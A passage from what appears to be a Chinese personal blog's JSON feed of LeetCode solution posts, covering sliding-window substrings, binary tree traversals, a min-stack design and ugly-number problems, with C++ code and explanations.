            "date_published": "2022-03-18T12:54:40.000Z",
            "content_html": "<p>题目链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS5jbi9wcm9ibGVtcy9sb25nZXN0LXN1YnN0cmluZy13aXRob3V0LXJlcGVhdGluZy1jaGFyYWN0ZXJzLw==\">无重复字符的最长字串</span></p>\n<p>题目详情：</p>\n<p><img data-src=\"/../../../post_images/%E6%97%A0%E9%87%8D%E5%A4%8D%E5%AD%97%E7%AC%A6%E7%9A%84%E6%9C%80%E9%95%BF%E5%AD%97%E4%B8%B2_%E9%A2%98%E7%9B%AE%E8%AF%A6%E6%83%85.jpg\"></p>\n<pre><code class=\"cpp\">class Solution {\npublic:\n    int lengthOfLongestSubstring(string s) {\n        if(s.size()==0)\n            return 0;\n        int ans = 1;\n        int left = 0;\n        unordered_set&lt;char&gt;temp;\n        for(int i=0;i&lt;s.size();i++)         // 遍历每个元素\n        {\n            while(temp.find(s[i])!=temp.end())          // 如果出现过了，由于求的是子串，故以此为开头的字符必不成立，故删去开头\n            {\n                temp.erase(s[left]);\n                left++;\n            }\n            temp.insert(s[i]);                         // 找到没有出现过的字符，加入\n            ans = max(ans,i-left+1);\n        }\n        return ans;\n    }\n};\n</code></pre>\n",
            "tags": [
                "滑动窗口",
                "哈希表",
                "字符串"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/e85d694a/",
            "url": "http://dpm12345.cn/posts/e85d694a/",
            "title": "二叉树",
            "date_published": "2022-02-20T12:07:26.000Z",
            "content_html": "<h1 id=\"树的相关定义\"><a href=\"#树的相关定义\" class=\"headerlink\" title=\"树的相关定义\"></a>树的相关定义</h1><p>![](../../../post_images/树.jpeg “树”)</p>\n<ul>\n<li>组成：树由若干个节点构成，根节点在最上方，如图 1 为根节点</li>\n<li>度：节点下方延申的部分称为子树，其个数被称为度，如图 2，3，4，5 为 1 的度，个数为 4叶子节点和分支节点：度为$0$ 的节点被称为</li>\n<li>叶子节点或终端节点，不为$0$ 被称为非终端节点或分支节点，如 13 为叶子节点，3 为分支节点</li>\n<li>父节点：若一个节点含有子节点，那么称为该子节点的父节点，如 6 为 13 的父节点</li>\n<li>兄弟节点：具有相同父节点的节点互称为兄弟节点，如 2，3，4，5</li>\n<li>树的度：一棵树中，最大的节点的度称为树的度</li>\n<li>节点点的层次：从根开始定义起，根为第 1 层，根的子节点为第 2 层，以此类推；树的高度或深度：树中节点的最大层次，如图为 4</li>\n<li>节点的祖先：从根到该节点所经分支上的所有节点；如上图：1 是所有节点的祖先</li>\n<li>子孙：以某节点为根的子树中任一节点都称为该节点的子孙。如上图：所有节点都是 1 的子孙</li>\n</ul>\n<h1 id=\"二叉树的定义\"><a href=\"#二叉树的定义\" class=\"headerlink\" title=\"二叉树的定义\"></a>二叉树的定义</h1><p>只有两个子树</p>\n<p>基本组成形式为 节点 + 左子树 + 右子树 </p>\n<p>如图:</p>\n<p><img data-src=\"/../../../post_images/%E4%BA%8C%E5%8F%89%E6%A0%91.jpeg\" title=\"二叉树\"></p>\n<h1 id=\"特殊的二叉树\"><a href=\"#特殊的二叉树\" class=\"headerlink\" title=\"特殊的二叉树\"></a>特殊的二叉树</h1><p>**满二叉树:**一个二叉树，如果每一个层的结点数都达到最大值，则这个二叉树就是满二叉树。也就是说，如果一个二叉树的层数为$K$，且结点总数是$2^k-1$，则它就是满二叉树。</p>\n<p>**完全二叉树:**完全二叉树是效率很高的数据结构，完全二叉树是由满二叉树而引出来的。对于深度为$K$的，有$n$个结点的二叉树，当且仅当其每一个结点都与深度为$K$的满二叉树中编号从1至n的结点一一对应时称之为完全二叉树。要注意的是满二叉树是一种特殊的完全二叉树。</p>\n<p>![](../../../post_images/满二叉树.png “满二叉树”)</p>\n<h1 id=\"二叉树的性质\"><a href=\"#二叉树的性质\" class=\"headerlink\" title=\"二叉树的性质\"></a>二叉树的性质</h1><ul>\n<li>若规定根节点的层数为$1$，则一棵非空二叉树的第$i$层上最多有$2^{i-1}$个结点.</li>\n<li>若规定根节点的层数为$1$，则深度为h的二叉树的最大结点数是$2^h-1$.</li>\n<li>对任何一棵二叉树，如果度为$0$其叶结点个数为$n_0$, 度为2的分支结点个数为$n_2$, 则有$n_0＝n_2+1$</li>\n<li>若规定根节点的层数为$1$，具有$n$个结点的满二叉树的深度，$h=LogN$</li>\n</ul>\n<h1 id=\"二叉树的实现形式\"><a href=\"#二叉树的实现形式\" class=\"headerlink\" title=\"二叉树的实现形式\"></a>二叉树的实现形式</h1><h2 id=\"顺序形式\"><a href=\"#顺序形式\" class=\"headerlink\" title=\"顺序形式\"></a>顺序形式</h2><p>采用数组的方式，一个存放一个节点，可能会存在空，大小需要变化</p>\n<p>采用该种方式构建的完全二叉树</p>\n<p>性质</p>\n<ul>\n<li>左子树根节点 $leftchild=parent*2+1$</li>\n<li>右子树根节点 $leftchild=parent*2+1$</li>\n<li>根节点 $parent=(child-1)/2$</li>\n</ul>\n<h2 id=\"链式形式\"><a href=\"#链式形式\" class=\"headerlink\" title=\"链式形式\"></a>链式形式</h2><p>可以定义出每一个节点，用地址进行链接</p>\n<h3 id=\"二叉树的链式实现及相关遍历\"><a href=\"#二叉树的链式实现及相关遍历\" class=\"headerlink\" title=\"二叉树的链式实现及相关遍历\"></a>二叉树的链式实现及相关遍历</h3><h4 id=\"实现\"><a href=\"#实现\" class=\"headerlink\" title=\"实现\"></a>实现</h4><p>代码如下</p>\n<pre><code class=\"c++\">//tree.h\n#ifndef TREE_H\n#define TREE_H\n\n// 每个结点的定义\ntemplate&lt;class T&gt;\nclass RNode{\npublic:\n    T data;\n    class RNode&lt;T&gt; * lNode;\n    class RNode&lt;T&gt; * rNode;\n};\n\n#endif\n\n//tree.c\nvoid test1()\n{\n    //A\n    RNode&lt;int&gt;* A = new RNode&lt;int&gt;;\n    A-&gt;data = 5;\n    A-&gt;lNode = nullptr;\n    A-&gt;rNode = nullptr;\n    //B\n    RNode&lt;int&gt;* B = new RNode&lt;int&gt;;\n    B-&gt;data = 3;\n    B-&gt;lNode = nullptr;\n    B-&gt;rNode = nullptr;\n    //C\n    RNode&lt;int&gt;* C = new RNode&lt;int&gt;;\n    C-&gt;data = 4;\n    C-&gt;lNode = nullptr;\n    C-&gt;rNode = nullptr;\n    //D\n    RNode&lt;int&gt;* D = new RNode&lt;int&gt;;\n    D-&gt;data = 7;\n    D-&gt;lNode = nullptr;\n    D-&gt;rNode = nullptr;\n    //E\n    RNode&lt;int&gt;* E = new RNode&lt;int&gt;;\n    E-&gt;data = 12;\n    E-&gt;lNode = nullptr;\n    E-&gt;rNode = nullptr;\n\n    // 建立联系\n    A-&gt;lNode = B;\n    A-&gt;rNode = C;\n    B-&gt;lNode = D;\n    C-&gt;rNode = E;\n}\n</code></pre>\n<h4 id=\"遍历\"><a href=\"#遍历\" class=\"headerlink\" title=\"遍历\"></a>遍历</h4><h5 id=\"前序\"><a href=\"#前序\" class=\"headerlink\" title=\"前序\"></a>前序</h5><p>根 –&gt; 左子树 –&gt; 右子树</p>\n<p>leetcode相关链接: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvYmluYXJ5LXRyZWUtcHJlb3JkZXItdHJhdmVyc2FsLw==\">二叉树的前序遍历</span></p>\n<p>代码</p>\n<pre><code class=\"c++\">void PrevOrder(RNode&lt;int&gt;* P)\n{\n    if (P == nullptr)\n    {\n        cout &lt;&lt; \"NULL \";\n        return;\n    }\n    cout &lt;&lt; P-&gt;data &lt;&lt; \" \";\n    PrevOrder(P-&gt;lNode);\n    PrevOrder(P-&gt;rNode);\n}\n</code></pre>\n<p>附上 leetcode 上的迭代写法</p>\n<pre><code class=\"c++\">class Solution {\npublic:\n    vector&lt;int&gt; preorderTraversal(TreeNode* root) {\n        vector&lt;int&gt;ans;\n        if(root==nullptr)\n            return ans;\n        \n        stack&lt;TreeNode*&gt;record;\n        TreeNode* node=root;\n        while(!record.empty()||node!=nullptr)\n        {\n            while(node!=nullptr)\n            {\n                ans.push_back(node-&gt;val);\n                record.push(node);\n                node=node-&gt;left;\n            }\n            node=record.top();\n            record.pop();\n            node=node-&gt;right;\n        }\n        return ans;\n    }\n};\n</code></pre>\n<h5 id=\"中序\"><a href=\"#中序\" class=\"headerlink\" title=\"中序\"></a>中序</h5><p>左子树 –&gt; 根 –&gt; 右子树</p>\n<p>leetcode相关链接:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvYmluYXJ5LXRyZWUtaW5vcmRlci10cmF2ZXJzYWwv\">二叉树的中序遍历</span></p>\n<p>代码</p>\n<pre><code class=\"c++\">void MidOrder(RNode&lt;int&gt;* P)\n{\n    if (P == nullptr)\n    {\n        cout &lt;&lt; \"NULL \";\n        return;\n    }\n    MidOrder(P-&gt;lNode);\n    cout &lt;&lt; P-&gt;data &lt;&lt; \" \";\n    MidOrder(P-&gt;rNode);\n}\n</code></pre>\n<p>附上leetcode上的迭代写法</p>\n<pre><code class=\"c++\">class Solution {\npublic:\n    vector&lt;int&gt; inorderTraversal(TreeNode* root) {\n        vector&lt;int&gt;ans;\n        if(root==nullptr)\n            return ans;\n        stack&lt;TreeNode*&gt;re;\n        TreeNode* node=root;\n        while(!re.empty()||node!=nullptr)\n        {\n            while(node!=nullptr)\n            {\n                re.push(node);\n                node=node-&gt;left;\n            }\n            node=re.top();\n            ans.push_back(node-&gt;val);\n            re.pop();\n            node=node-&gt;right;\n        }\n        return ans;\n    }\n};\n</code></pre>\n<h5 id=\"后序\"><a href=\"#后序\" class=\"headerlink\" title=\"后序\"></a>后序</h5><p>左子树 –&gt;右子树 –&gt;根</p>\n<p>leetcode 相关链接:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvYmluYXJ5LXRyZWUtcHJlb3JkZXItdHJhdmVyc2FsLw==\">二叉树的后序遍历</span></p>\n<p>代码</p>\n<pre><code class=\"c++\">void LastOrder(RNode&lt;int&gt;* P)\n{\n    if (P == nullptr)\n    {\n        cout &lt;&lt; \"NULL \";\n        return;\n    }\n    LastOrder(P-&gt;lNode);\n    LastOrder(P-&gt;rNode);\n    cout &lt;&lt; P-&gt;data &lt;&lt; \" \";\n}\n</code></pre>\n<p>附上leetcode上的迭代写法</p>\n<pre><code class=\"c++\">class Solution {\npublic:\n    vector&lt;int&gt; postorderTraversal(TreeNode *root) {\n        vector&lt;int&gt; res;\n        if (root == nullptr) {\n            return res;\n        }\n\n        stack&lt;TreeNode *&gt; stk;\n        TreeNode *prev = nullptr;\n        while (root != nullptr || !stk.empty()) {\n            while (root != nullptr) {\n                stk.emplace(root);\n                root = root-&gt;left;\n            }\n            root = stk.top();\n            stk.pop();\n            if (root-&gt;right == nullptr || root-&gt;right == prev) {\n                res.emplace_back(root-&gt;val);\n                prev = root;\n                root = nullptr;\n            } else {\n                stk.emplace(root);\n                root = root-&gt;right;\n            }\n        }\n        return res;\n    }\n};\n</code></pre>\n<p>相关解释</p>\n<p>为了实现这一顺序，该方法中</p>\n<ol>\n<li><p>由于左子树始终首先输出，那么依旧存入所有的左子树结点</p>\n</li>\n<li><p>为了防止根先于右子树输出，在该方法中，使用了<code>prev</code>这一变量，代表的是前一个右子树，只有当右子树为空或者右子树之前输出过了才可以输入<code>root</code>的内容，而为了先输出右子树的内容，会将右子树的根节点存入栈中，并指向该节点的右子树</p>\n</li>\n<li><p>然后再判断上面的指向是否为存在子树(即进入while循环判断，如果有，那么继续深入)</p>\n</li>\n<li><p>之后按照正常输出即可</p>\n</li>\n</ol>\n<h1 id=\"其他相关题目\"><a href=\"#其他相关题目\" class=\"headerlink\" title=\"其他相关题目\"></a>其他相关题目</h1><ol>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvbWF4aW11bS1kZXB0aC1vZi1iaW5hcnktdHJlZS8=\">二叉树的最大深度</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvYmFsYW5jZWQtYmluYXJ5LXRyZWUv\">平衡二叉树</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvYmluYXJ5LXRyZWUtbGV2ZWwtb3JkZXItdHJhdmVyc2FsLw==\">二叉树的层序遍历</span></li>\n</ol>\n",
            "tags": [
                "树",
                "二叉树",
                "数据结构"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/5c639822/",
            "url": "http://dpm12345.cn/posts/5c639822/",
            "title": "最小栈",
            "date_published": "2022-01-24T14:54:40.000Z",
            "content_html": "<p>题目链接:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvbWluLXN0YWNrLw==\">最小栈</span></p>\n<p>题目详情:</p>\n<p><img data-src=\"/../../../post_images/%E6%9C%80%E5%B0%8F%E6%A0%88.png\" alt=\"最小栈详情\"></p>\n<p>要完成题目所要的功能，首先至少需要一个栈存储压入数据</p>\n<p>而对于该栈的使用方法有所不同</p>\n<h2 id=\"用一个栈存储数据，使用-vector-数组存最小值\"><a href=\"#用一个栈存储数据，使用-vector-数组存最小值\" class=\"headerlink\" title=\"用一个栈存储数据，使用 vector 数组存最小值\"></a>用一个栈存储数据，使用 vector 数组存最小值</h2><p>在该方法中，入栈时，用$vector$存储最小值，当栈为空即可直接将要压入栈的值作为最小值，放入数组末尾，而如果栈不为空，那么根据压入值与最小值的比较，将较小值放入$vector$数组末尾，这样做的好处是在$pop()$操作时，不需判断$pop()$的值是否为最小值，可直接$pop_back()$$vector$数组末尾值</p>\n<p>代码如下:</p>\n<pre><code class=\"cpp\">class MinStack {\nprivate:\n    stack&lt;int&gt;a;\n    vector&lt;int&gt;m;\npublic:\n    MinStack() {\n\n    }\n    \n    void push(int val) {\n        if(a.empty())\n        {\n            a.push(val);\n            m.push_back(val);\n        }\n        else\n        {\n            a.push(val);\n            if(val&lt;m.back())\n            {\n                m.push_back(val);\n            }\n            else\n            {\n                m.push_back(m.back());\n            }\n        }\n    }\n    \n    void pop() {\n        a.pop();\n        m.pop_back();\n    }\n    \n    int top() {\n        return a.top();\n      \n    }\n    \n    int getMin() {\n       return m.back();\n    }\n};\n\n/**\n * Your MinStack object will be instantiated and called as such:\n * MinStack* obj = new MinStack();\n * obj-&gt;push(val);\n * obj-&gt;pop();\n * int param_3 = obj-&gt;top();\n * int param_4 = obj-&gt;getMin();\n */\n</code></pre>\n<h2 id=\"栈不用于存储数据，同时不需要额外空间存储\"><a href=\"#栈不用于存储数据，同时不需要额外空间存储\" class=\"headerlink\" title=\"栈不用于存储数据，同时不需要额外空间存储\"></a>栈不用于存储数据，同时不需要额外空间存储</h2><p>在该方法中，栈中存储的数值为压入栈值与当前最小值的差值</p>\n<p>代码如下:</p>\n<pre><code class=\"cpp\">class MinStack {\npublic:\n    stack&lt;long long&gt; st;   // 使用 long long 防止数据溢出\n    long long minv;\n\n    MinStack() {\n        minv = -1;\n    }\n\n    void push(int val) {\n        if (!st.size()) {\n            st.push(0);\n            minv = val;\n        }\n        else {// 这次的值减去已有的最小值\n            long long diff = val - minv;\n            st.push(diff);\n            minv = diff &lt; 0 ? val : minv;\n        }\n    }\n\n    void pop() {\n        if (st.size()) {\n            long long diff = st.top();\n            st.pop();\n            if (diff &lt; 0)\n                minv -= diff;\n        }\n    }\n\n    int top() {\n        long long diff = st.top();\n        if (diff &lt; 0)\n            return minv;\n        else \n            return minv + diff;\n    }\n    \n    int getMin() {\n        return minv;\n    }\n};\n</code></pre>\n",
            "tags": [
                "vector",
                "栈"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/73645ce2/",
            "url": "http://dpm12345.cn/posts/73645ce2/",
            "title": "丑数",
            "date_published": "2022-01-14T14:54:40.000Z",
            "content_html": "<p>丑数，其所有因数均属于所给的数字集合，如对于因数 2，3，5，</p>\n<p>2，6，10 均为满足条件的丑数</p>\n<p>以下为 leetcode 上丑数的相关问题</p>\n<h1 id=\"丑数\"><a class=\"anchor\" href=\"#丑数\">#</a> 丑数</h1>\n<p>题目链接:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvdWdseS1udW1iZXIvc29sdXRpb24v\"> 丑数</span></p>\n<p>题目详情：</p>\n<p><img data-src=\"../../../post_images/%E4%B8%91%E6%95%B0_%E9%A2%98%E7%9B%AE%E8%AF%A6%E6%83%85.png\" alt=\"\"></p>\n<p>根据丑数因数特点，我们可以依次不断除以所给因数集的各因数，如果其为丑数，结束后其必定变为数字 <code>1</code> ，如果不满足，其必不为 <code>1</code></p>\n<p>代码如下:</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"><span>丑数</span></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Solution</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">public</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">bool</span> <span class=\"token function\">isUgly</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> n<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>n<span class=\"token operator\">&lt;=</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">int</span> div<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token number\">5</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span><span class=\"token number\">3</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>n <span class=\"token operator\">%</span> div<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>                n <span class=\"token operator\">/=</span> div<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">return</span> n<span class=\"token operator\">==</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><h1 id=\"丑数-ii\"><a class=\"anchor\" href=\"#丑数-ii\">#</a> 丑数 II</h1>\n<p>题目链接:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvdWdseS1udW1iZXItaWkv\"> 丑数 II</span></p>\n<p>题目详情:</p>\n<p><img data-src=\"../../../post_images/%E4%B8%91%E6%95%B0II_%E9%A2%98%E7%9B%AE%E8%AF%A6%E6%83%85.png\" alt=\"\"></p>\n<p><strong>思路:</strong></p>\n<p>这一道题目的因数集与上题相同，但要求不同，求的是满足条件的第<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>n</mi></mrow><annotation encoding=\"application/x-tex\">n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">n</span></span></span></span> 个丑数</p>\n<p>仔细观察题目示例，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">[</mo><mn>1</mn><mo separator=\"true\">,</mo><mn>2</mn><mo separator=\"true\">,</mo><mn>3</mn><mo separator=\"true\">,</mo><mn>4</mn><mo separator=\"true\">,</mo><mn>5</mn><mo separator=\"true\">,</mo><mn>6</mn><mo separator=\"true\">,</mo><mn>8</mn><mo separator=\"true\">,</mo><mn>9</mn><mo separator=\"true\">,</mo><mn>10</mn><mo separator=\"true\">,</mo><mn>12</mn><mo stretchy=\"false\">]</mo></mrow><annotation encoding=\"application/x-tex\">[1,2,3,4,5,6,8,9,10,12]</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">[</span><span class=\"mord\">1</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">2</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">3</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">4</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">5</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">6</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">8</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">9</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">1</span><span class=\"mord\">0</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">1</span><span class=\"mord\">2</span><span class=\"mclose\">]</span></span></span></span> 为前十个丑数组成的序列，结合丑数特点，每个数字最多只有<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>2</mn><mo separator=\"true\">,</mo><mn>3</mn><mo separator=\"true\">,</mo><mn>5</mn></mrow><annotation encoding=\"application/x-tex\">2,3,5</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8388800000000001em;vertical-align:-0.19444em;\"></span><span class=\"mord\">2</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">3</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">5</span></span></span></span>，三个因数，也就是说我们可以利用动态规划的思想，在前面的基础上乘以因数<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>2</mn><mo separator=\"true\">,</mo><mn>3</mn><mo separator=\"true\">,</mo><mn>5</mn></mrow><annotation encoding=\"application/x-tex\">2,3,5</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8388800000000001em;vertical-align:-0.19444em;\"></span><span class=\"mord\">2</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">3</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">5</span></span></span></span>​，得到的数必然为满足的丑数。由于要涵盖所有的数，那么前面的数都应要乘各项因数，因此可以为不同因数各设置一个记录应该乘第几个丑数的变量，并将所得乘积记录到数组中，在取时，只需取数组中的最小值即可，取出后相应的也需要更新该因数对应的最小数</p>\n<p>由于存在公倍数，因此在判断取出的数是哪个因数时需要对每个因素都进行判断一次，排除重复的情况</p>\n<p>代码如下:</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"><span>丑数II</span></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Solution</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">public</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">int</span> <span class=\"token function\">nthUglyNumber</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> n<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        vector<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">&gt;</span> <span class=\"token function\">dp</span><span class=\"token punctuation\">(</span>n <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">//dp [n] 表示第 n 个丑数</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        dp<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>              <span class=\"token comment\">// 默认第一个为 1</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">int</span> p2 <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> p3 <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> p5 <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>   <span class=\"token comment\">//p2,p3,p5 分别表示对应因数应乘的丑数下标</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;=</span> n<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            <span class=\"token keyword\">int</span> num2 <span class=\"token operator\">=</span> dp<span class=\"token punctuation\">[</span>p2<span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> num3 <span class=\"token operator\">=</span> dp<span class=\"token punctuation\">[</span>p3<span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> num5 <span class=\"token operator\">=</span> dp<span class=\"token punctuation\">[</span>p5<span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">5</span><span class=\"token punctuation\">;</span>   <span class=\"token comment\">// 更新数组</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            dp<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">min</span><span class=\"token punctuation\">(</span><span class=\"token function\">min</span><span class=\"token punctuation\">(</span>num2<span class=\"token punctuation\">,</span> num3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> num5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>         <span class=\"token comment\">// 找到最小值</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>dp<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> num2<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>                        <span class=\"token comment\">// 判断该最小值是否由因数 2 得到</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>                p2<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>dp<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> num3<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>                        <span class=\"token comment\">// 判断该最小值是否由因数 2 得到</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>                p3<span class=\"token operator\">++</span><span class=\"token 